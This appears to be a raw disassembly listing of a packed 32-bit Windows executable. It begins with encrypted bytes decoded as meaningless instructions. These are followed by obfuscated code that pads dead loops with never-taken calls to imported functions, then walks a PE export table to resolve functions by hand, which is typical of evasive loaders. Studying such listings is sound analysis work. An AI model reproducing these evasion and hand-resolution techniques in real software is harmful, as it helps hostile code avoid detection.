  4048e7:	sbb    DWORD PTR [edi+0x39],ebx
  4048ea:	cmp    eax,0x733955e9
  4048ef:	sti    
  4048f0:	call   0x9575e09b
  4048f5:	inc    esi
  4048f6:	mov    BYTE PTR [edx-0x7cfe4060],bh
  4048fc:	aas    
  4048fd:	and    ecx,ecx
  4048ff:	mov    ah,0x2a
  404901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404902:	inc    bh
  404904:	jbe    0x404938
  404906:	mov    esi,0xdae4bfd1
  40490b:	ins    DWORD PTR es:[edi],dx
  40490c:	push   edx
  40490d:	jg     0x4ac5f3cb
  404913:	sbb    eax,0xaea1f8fe
  404918:	and    eax,0x8fd96f66
  40491d:	push   0xffffff8c
  40491f:	int3   
  404920:	mov    WORD PTR [edx-0x7c],cs
  404923:	enter  0xf03,0x27
  404927:	retf   0xd3f5
  40492a:	inc    eax
  40492b:	js     0x404900
  40492d:	stos   DWORD PTR es:[edi],eax
  40492e:	push   es
  40492f:	adc    DWORD PTR [edi+0x7ebc3777],0x5b7db824
  404939:	dec    ebx
  40493a:	in     al,dx
  40493b:	hlt    
  40493c:	popf   
  40493d:	in     al,dx
  40493e:	ror    DWORD PTR [ebp-0x44],1
  404941:	inc    ebx
  404942:	jp     0x404961
  404944:	cmc    
  404945:	jecxz  0x4049bb
  404947:	push   ecx
  404948:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404949:	popa   
  40494a:	or     ch,BYTE PTR [esi+eiz*2]
  40494d:	push   cs
  40494e:	stos   BYTE PTR es:[edi],al
  40494f:	mov    eax,0x631b137c
  404954:	mov    ebx,0x82efb380
  404959:	test   BYTE PTR [eax],dh
  40495b:	inc    eax
  40495c:	outs   dx,BYTE PTR ds:[esi]
  40495d:	in     al,dx
  40495e:	int    0xb5
  404960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404961:	(bad)  
  404962:	cld    
  404963:	inc    eax
  404964:	and    eax,0xb2f961fc
  404969:	inc    ebx
  40496a:	push   ds
  40496b:	fscale 
  40496d:	ins    DWORD PTR es:[edi],dx
  40496e:	ins    BYTE PTR es:[edi],dx
  40496f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404970:	out    dx,eax
  404971:	sbb    DWORD PTR [ebp+0x16],ebp
  404974:	mov    ebx,0x56e5c884
  404979:	fisub  WORD PTR [esi]
  40497b:	mov    dl,0x31
  40497d:	and    al,0x19
  40497f:	fisttp WORD PTR es:[edx-0x39df6c91]
  404986:	push   eax
  404987:	and    al,0x4d
  404989:	push   esp
  40498a:	int3   
  40498b:	out    dx,eax
  40498c:	outs   dx,DWORD PTR ds:[esi]
  40498d:	and    ecx,DWORD PTR [ebx]
  40498f:	xchg   ecx,eax
  404990:	pop    ecx
  404991:	lds    ebx,FWORD PTR [eax-0x80]
  404994:	jae    0x4049ef
  404996:	pushf  
  404997:	lods   eax,DWORD PTR ds:[esi]
  404998:	sbb    ebp,ecx
  40499a:	popf   
  40499b:	out    0x6d,al
  40499d:	cmp    dl,ch
  40499f:	std    
  4049a0:	xchg   edx,eax
  4049a1:	mov    eax,0x6f990f4e
  4049a6:	jmp    DWORD PTR [esp+edi*8]
  4049a9:	adc    dl,BYTE PTR [esi+0x54]
  4049ac:	add    dl,bh
  4049ae:	and    ah,dl
  4049b0:	sub    dh,ah
  4049b2:	xor    al,0x1c
  4049b4:	or     al,0xc0
  4049b6:	push   esp
  4049b7:	push   ebx
  4049b9:	inc    ecx
  4049ba:	addr16 pop edx
  4049bc:	pop    es
  4049bd:	out    dx,eax
  4049be:	ja     0x4049c9
  4049c0:	shl    BYTE PTR [ebp+0x1e],cl
  4049c3:	mov    eax,0xc2ec6cb8
  4049c8:	xor    cl,0x81
  4049cb:	sbb    BYTE PTR [eax+0x5c],bh
  4049ce:	aas    
  4049cf:	loop   0x404972
  4049d1:	sti    
  4049d2:	fild   QWORD PTR ds:0x54b9aaf2
  4049d8:	gs push cs
  4049da:	rcl    DWORD PTR [edx],cl
  4049dc:	push   ecx
  4049dd:	mov    ebx,0x11cec3b1
  4049e2:	call   FWORD PTR [edx]
  4049e4:	jnp    0x404a3d
  4049e6:	mov    al,ds:0xd9be3800
  4049eb:	jo     0x404985
  4049ed:	fist   WORD PTR ds:0x2eba7c96
  4049f3:	enter  0x50e7,0x5f
  4049f7:	in     al,0xaf
  4049f9:	xchg   ebp,eax
  4049fa:	out    dx,al
  4049fb:	xchg   esi,eax
  4049fc:	sbb    BYTE PTR [edx-0x14032c60],ch
  404a02:	cmp    al,dl
  404a04:	sbb    eax,0xebdb95a2
  404a09:	bound  ecx,QWORD PTR [ebx]
  404a0b:	stos   DWORD PTR es:[edi],eax
  404a0c:	jmp    0xcb34db67
  404a11:	mov    edi,0x14f1c65b
  404a16:	ss daa 
  404a18:	sar    DWORD PTR [esi-0x117b84a2],cl
  404a1e:	and    eax,0x35fc295f
  404a23:	xchg   esi,eax
  404a24:	mov    eax,ds:0x4b14e18d
  404a29:	cmp    BYTE PTR [edi],dh
  404a2b:	data16 mov ch,0xea
  404a2e:	inc    esi
  404a2f:	pusha  
  404a30:	push   esp
  404a31:	jp     0x4049db
  404a33:	mov    cl,0xa
  404a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a36:	add    DWORD PTR [eax],ebp
  404a38:	pop    es
  404a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a3a:	inc    esi
  404a3b:	stc    
  404a3c:	call   0xb738:0x66a04d80
  404a43:	mov    ch,0xa6
  404a45:	jo     0x404a9c
  404a47:	std    
  404a48:	cmp    BYTE PTR [ebx-0x2bd543ae],0x1
  404a4f:	mov    DWORD PTR [esi+edi*4+0x23],0x3b128022
  404a57:	and    dh,0xeb
  404a5a:	test   DWORD PTR [ebp+ebx*8-0x3901d5df],edx
  404a61:	mov    esi,ss
  404a63:	or     esi,ebp
  404a65:	push   0x24
  404a67:	xor    eax,0xf69fe1b8
  404a6c:	jg     0x404ad9
  404a6e:	jae    0x404ae8
  404a70:	push   edx
  404a71:	mov    al,ds:0x5cccf73
  404a76:	jp     0x404adb
  404a78:	js     0x404a47
  404a7a:	adc    DWORD PTR [ecx],0xffffff99
  404a7d:	and    eax,0x449b93f0
  404a82:	xlat   BYTE PTR ds:[ebx]
  404a83:	je     0x404aab
  404a85:	or     eax,0x758fe3ef
  404a8a:	shr    BYTE PTR [ebx-0x42ef7444],0x7e
  404a91:	fs fdiv st(1),st
  404a94:	ret    
  404a95:	iret   
  404a96:	(bad)  
  404a97:	out    0xb0,al
  404a99:	and    eax,0x609b012f
  404a9e:	mov    bh,0x92
  404aa0:	jae    0x404ae5
  404aa2:	jne    0x404b1b
  404aa4:	sbb    esp,esi
  404aa6:	sbb    edi,0x50
  404aa9:	stos   BYTE PTR es:[edi],al
  404aaa:	dec    ebx
  404aab:	arpl   WORD PTR [edx],di
  404aad:	push   cs
  404aae:	cmp    edi,DWORD PTR [ebp-0x35e647c4]
  404ab4:	push   edx
  404ab5:	inc    ebp
  404ab6:	xchg   edi,eax
  404ab7:	imul   esi,ebx,0xa
  404aba:	xchg   ebp,eax
  404abb:	in     al,dx
  404abc:	inc    ebp
  404abd:	sub    esp,ebx
  404abf:	int3   
  404ac0:	sub    ebx,ebp
  404ac2:	bound  ecx,QWORD PTR [ebp+0x3d8723a1]
  404ac8:	(bad)  
  404ac9:	std    
  404aca:	jl     0x404b0a
  404acc:	in     al,dx
  404acd:	sar    esp,cl
  404acf:	lods   al,BYTE PTR ds:[esi]
  404ad0:	retf   
  404ad1:	cld    
  404ad2:	add    al,0x8b
  404ad5:	mov    esi,0x664687d2
  404ada:	add    eax,eax
  404adc:	out    dx,eax
  404add:	or     esi,ecx
  404adf:	jl     0x404a9a
  404ae1:	push   0x98f43121
  404ae6:	cli    
  404ae7:	push   0x79
  404ae9:	mov    BYTE PTR [ecx-0xc0c45],ch
  404aef:	mov    eax,DWORD PTR [esi]
  404af1:	xchg   ebx,eax
  404af2:	cli    
  404af3:	xchg   cl,dl
  404af5:	ds dec ecx
  404af7:	jmp    0x404b5d
  404af9:	repnz or DWORD PTR [ebx+0x40],0xae544d90
  404b01:	mov    al,0xf2
  404b03:	sub    dl,dl
  404b05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b06:	jbe    0x404b85
  404b08:	js     0x404b0a
  404b0a:	pop    es
  404b0b:	mov    al,0x57
  404b0d:	ja     0x404b19
  404b0f:	and    edx,ebp
  404b11:	in     al,dx
  404b12:	pop    es
  404b13:	fs push ds
  404b15:	out    0xc4,al
  404b17:	push   edx
  404b18:	mov    edx,0x32b08df0
  404b1d:	push   0xc29ef304
  404b22:	icebp  
  404b23:	in     eax,0x1a
  404b25:	add    ah,BYTE PTR [eax]
  404b27:	outs   dx,DWORD PTR ds:[esi]
  404b28:	mov    eax,ds:0xa04f312
  404b2d:	loope  0x404b7f
  404b2f:	xchg   ecx,eax
  404b30:	sbb    al,0x6
  404b32:	pop    ss
  404b33:	mov    WORD PTR [ebx],gs
  404b35:	or     DWORD PTR [esp+ebx*4-0x15],0x79
  404b3a:	repnz cmp DWORD PTR [esi+eax*8-0x6e958c49],esi
  404b42:	stos   DWORD PTR es:[edi],eax
  404b43:	mov    dl,0x7a
  404b45:	div    BYTE PTR [eax+esi*1-0x26]
  404b49:	sbb    edi,DWORD PTR [eax-0x6c1b4746]
  404b4f:	pop    esi
  404b50:	cmp    BYTE PTR [ebp-0x518c711c],0x79
  404b57:	sub    ecx,esp
  404b59:	ret    
  404b5a:	int    0xfa
  404b5c:	lea    ecx,[eax]
  404b5e:	xlat   BYTE PTR ds:[ebx]
  404b5f:	sub    DWORD PTR [edx+0x4],esi
  404b62:	(bad)  
  404b64:	dec    eax
  404b65:	add    cl,dh
  404b67:	cmp    esp,esp
  404b69:	xor    eax,0x652b48dc
  404b6e:	faddp  st(1),st
  404b70:	pop    ss
  404b71:	mov    bl,BYTE PTR [edi+0x62]
  404b74:	xor    eax,0xdc7159fd
  404b79:	call   0xef968a48
  404b7e:	mov    eax,eax
  404b80:	hlt    
  404b81:	adc    edx,esi
  404b83:	mov    edx,0x9a2c4dae
  404b88:	jmp    0x3b9b:0x2106deb3
  404b8f:	mov    DWORD PTR [esi-0x2d4653ab],ecx
  404b95:	lods   al,BYTE PTR ds:[esi]
  404b96:	nop
  404b97:	jecxz  0x404baf
  404b99:	mov    WORD PTR [esi],gs
  404b9b:	jl     0x404c01
  404b9d:	test   eax,0x19a7c879
  404ba2:	sub    dl,BYTE PTR [ebp-0x8f5e015]
  404ba8:	stc    
  404ba9:	mov    ds:0x61453f72,al
  404bae:	inc    ecx
  404baf:	sar    BYTE PTR [ecx+0x3543d040],cl
  404bb5:	call   0x43bb7d5a
  404bba:	rcl    ebx,1
  404bbc:	in     eax,0x58
  404bbe:	or     DWORD PTR [ebx-0x5a],ebx
  404bc1:	sbb    edi,ecx
  404bc3:	cli    
  404bc4:	pop    ebx
  404bc5:	fisubr DWORD PTR ds:0x5e44a68d
  404bcb:	jle    0x404c25
  404bcd:	out    0xff,eax
  404bcf:	cwde   
  404bd0:	mul    DWORD PTR [edx+0x1]
  404bd3:	jnp    0x404ba9
  404bd5:	pop    ss
  404bd6:	sub    al,0x7e
  404bd8:	fcmovnu st,st(2)
  404bda:	fst    DWORD PTR [eax]
  404bdc:	rcr    cl,0xaf
  404bdf:	mov    bl,0xde
  404be1:	outs   dx,BYTE PTR ds:[esi]
  404be2:	cmp    BYTE PTR [ebp-0x78],dh
  404be5:	sub    bl,BYTE PTR [esi-0x70]
  404be8:	cmp    dl,BYTE PTR [edx]
  404bea:	adc    dh,BYTE PTR [edi-0x6112de26]
  404bf0:	jl     0x404bd1
  404bf2:	(bad)  
  404bf3:	fcomp  QWORD PTR [ebx]
  404bf5:	outs   dx,BYTE PTR ds:[esi]
  404bf6:	mov    ebx,0x5e6112cf
  404bfb:	and    ah,ch
  404bfd:	jb     0x404be7
  404bff:	xchg   esp,eax
  404c00:	fdiv   DWORD PTR [edi+edi*8+0x3003e55c]
  404c07:	gs dec esp
  404c09:	fld    QWORD PTR [esp+eax*8+0x3c79ff5a]
  404c10:	enter  0x2291,0xbc
  404c14:	stos   BYTE PTR es:[edi],al
  404c15:	jbe    0x404bf2
  404c17:	enter  0x4719,0x2b
  404c1b:	pusha  
  404c1c:	daa    
  404c1d:	aaa    
  404c1e:	pop    edx
  404c1f:	shl    BYTE PTR [ebp-0x38],1
  404c22:	in     al,0xbe
  404c24:	add    edi,DWORD PTR [ebp+0x31]
  404c27:	sar    DWORD PTR [edx-0xc0d62c4],1
  404c2d:	sub    dl,dl
  404c2f:	test   eax,0xddf18813
  404c34:	xor    eax,0x73122f
  404c39:	pop    esi
  404c3a:	inc    ecx
  404c3b:	jns    0x404c61
  404c3d:	dec    ecx
  404c3e:	or     DWORD PTR [ebp+0x70a86895],ebp
  404c44:	inc    edx
  404c45:	inc    esi
  404c46:	stos   BYTE PTR es:[edi],al
  404c47:	push   ss
  404c48:	adc    BYTE PTR [ecx+eax*8-0x3e668cb9],bl
  404c4f:	jbe    0x404c35
  404c51:	mov    dl,BYTE PTR [eax+0x7eef9127]
  404c57:	pop    es
  404c58:	jle    0x404c36
  404c5a:	loope  0x404bde
  404c5c:	add    ebx,ebp
  404c5e:	fwait
  404c5f:	pop    edi
  404c60:	adc    eax,0xc8993154
  404c65:	(bad)
  404c68:	pushf  
  404c69:	mul    BYTE PTR [edi]
  404c6b:	mov    ebp,esp
  404c6d:	stos   DWORD PTR es:[edi],eax
  404c6e:	stos   BYTE PTR es:[edi],al
  404c6f:	(bad)  
  404c70:	shl    ah,1
  404c72:	fcomip st,st(4)
  404c74:	cmc    
  404c75:	rol    DWORD PTR [edx],1
  404c77:	jo     0x404c2f
  404c79:	js     0x404c1d
  404c7b:	icebp  
  404c7c:	mov    WORD PTR es:[edx],fs
  404c7f:	add    dl,dl
  404c81:	xor    bh,BYTE PTR fs:[ebp-0x73]
  404c85:	or     BYTE PTR [ebx-0x9106d32],al
  404c8b:	scas   eax,DWORD PTR es:[edi]
  404c8c:	daa    
  404c8d:	leave  
  404c8e:	jmp    0x404cd5
  404c90:	push   ebp
  404c91:	or     eax,0x6eebe418
  404c96:	jmp    0x404cc2
  404c98:	mov    dh,bl
  404c9a:	sub    al,ah
  404c9c:	inc    edx
  404c9d:	inc    esi
  404c9e:	repz cli 
  404ca0:	pop    edi
  404ca1:	mov    dl,0x45
  404ca3:	adc    DWORD PTR [ebp-0xf],ebp
  404ca6:	inc    ecx
  404ca7:	push   edi
  404ca8:	dec    esp
  404ca9:	xor    al,0x4d
  404cab:	xchg   ecx,eax
  404cac:	nop
  404cad:	or     eax,0x821fc061
  404cb2:	jb     0x404d10
  404cb4:	cmp    ax,0xd95c
  404cb8:	hlt    
  404cb9:	stos   BYTE PTR es:[edi],al
  404cba:	sbb    eax,0xd242f3d1
  404cbf:	test   BYTE PTR [ebx],bh
  404cc1:	arpl   WORD PTR [esi-0x29c68f6],bp
  404cc7:	xor    DWORD PTR [ecx-0x70b33895],edi
  404ccd:	or     al,0x7c
  404ccf:	sbb    al,0x32
  404cd1:	jnp    0x404d44
  404cd3:	mov    bl,BYTE PTR [eax]
  404cd5:	push   esi
  404cd6:	inc    ebx
  404cd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404cd8:	loop   0x404ccf
  404cda:	add    dh,dl
  404cdc:	mov    dl,BYTE PTR [edi+0x66]
  404cdf:	push   es
  404ce0:	cld    
  404ce1:	mov    ah,BYTE PTR ss:[ebx+0x62978dda]
  404ce8:	add    DWORD PTR [ebx],esi
  404cea:	push   esp
  404ceb:	xor    eax,0x7d1e0f7
  404cf0:	idiv   BYTE PTR [edx+edx*2]
  404cf3:	xchg   ecx,eax
  404cf4:	jb     0x404d5b
  404cf6:	dec    edi
  404cf7:	ja     0x404cfa
  404cf9:	push   es
  404cfa:	xchg   esp,eax
  404cfb:	push   ss
  404cfc:	jmp    0x7141:0x69918914
  404d03:	pusha  
  404d04:	bnd ret 0x19d1
  404d08:	cdq    
  404d09:	pop    eax
  404d0a:	out    dx,al
  404d0b:	xchg   ebp,eax
  404d0c:	fnstcw WORD PTR [esp+ebx*2]
  404d0f:	scas   al,BYTE PTR es:[edi]
  404d10:	sahf   
  404d11:	sub    esi,ebx
  404d13:	mov    cl,0xe1
  404d15:	repnz mov DWORD PTR [ecx-0x5a],ebp
  404d19:	sti    
  404d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d1b:	and    eax,0x45e4c318
  404d20:	add    ebx,0x5d
  404d23:	fadd   st(6),st
  404d25:	(bad)  
  404d26:	mov    WORD PTR [ebp+esi*1-0x645a56eb],?
  404d2d:	jmp    0xa0c7784e
  404d32:	pop    ecx
  404d33:	mov    ch,0xa8
  404d35:	call   0x2aecd26f
  404d3a:	push   es
  404d3b:	mov    eax,0xe02bfe21
  404d40:	add    BYTE PTR [ebx-0x66],bl
  404d43:	cmp    ah,BYTE PTR [eax]
  404d45:	jmp    0x8ba5303
  404d4a:	call   DWORD PTR [esp+eiz*4-0x2e]
  404d4e:	scas   eax,DWORD PTR es:[edi]
  404d4f:	aam    0x8b
  404d51:	mov    dh,0x93
  404d53:	mov    edx,0x913b9845
  404d58:	std    
  404d59:	cs leave 
  404d5b:	loop   0x404cff
  404d5d:	mov    esi,0x7a0a4e6c
  404d62:	fwait
  404d63:	push   ecx
  404d64:	pop    edi
  404d65:	cdq    
  404d66:	(bad)  
  404d67:	cmp    eax,0x446126ff
  404d6c:	mov    ebx,0x79860c7
  404d71:	xchg   BYTE PTR [esp+esi*2-0x51312951],bh
  404d78:	std    
  404d79:	(bad)  
  404d7a:	sub    al,0x37
  404d7c:	test   bh,ah
  404d7e:	pushf  
  404d7f:	xor    eax,0x7bf5b406
  404d84:	out    0x9e,eax
  404d86:	cmp    BYTE PTR [edi],bh
  404d88:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d8a:	inc    edx
  404d8b:	cmp    eax,0x4c7f4643
  404d90:	jbe    0x404d45
  404d92:	or     al,0x9e
  404d94:	std    
  404d95:	push   esp
  404d96:	or     BYTE PTR [esi],bh
  404d98:	ja     0x404d89
  404d9a:	sahf   
  404d9b:	stc    
  404d9c:	lea    ecx,[eax+0x46070c0c]
  404da2:	xlat   BYTE PTR ds:[ebx]
  404da3:	enter  0x1ffe,0x1c
  404da7:	jae    0x404e12
  404da9:	xor    eax,0x5c5af3dc
  404dae:	jo     0x404e0e
  404db0:	jae    0x404d45
  404db2:	adc    ebx,DWORD PTR [ebx+ebx*2]
  404db5:	pop    esi
  404db6:	sbb    eax,0xa2914f91
  404dbb:	(bad)  
  404dbc:	ret    0x1def
  404dbf:	repnz pop es
  404dc1:	loope  0x404e24
  404dc3:	pop    ecx
  404dc4:	push   edi
  404dc5:	jle    0x404d71
  404dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dc8:	xor    eax,0xed89980a
  404dcd:	sbb    bl,BYTE PTR [ecx+0x1abce7cc]
  404dd3:	cld    
  404dd4:	cld    
  404dd5:	(bad)  
  404dd6:	div    BYTE PTR [esi*2-0x6b661012]
  404ddd:	sub    eax,0xd49abf1f
  404de2:	call   0x3649:0x4dcd0f39
  404de9:	call   0xb8d2:0xed7a5487
  404df0:	js     0x404df1
  404df2:	mov    ebp,0xa9587da3
  404df7:	sbb    DWORD PTR [edi],ecx
  404df9:	test   al,bl
  404dfb:	add    BYTE PTR [eax],al
  404dfd:	add    BYTE PTR [ebx],ah
  404dff:	add    eax,0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
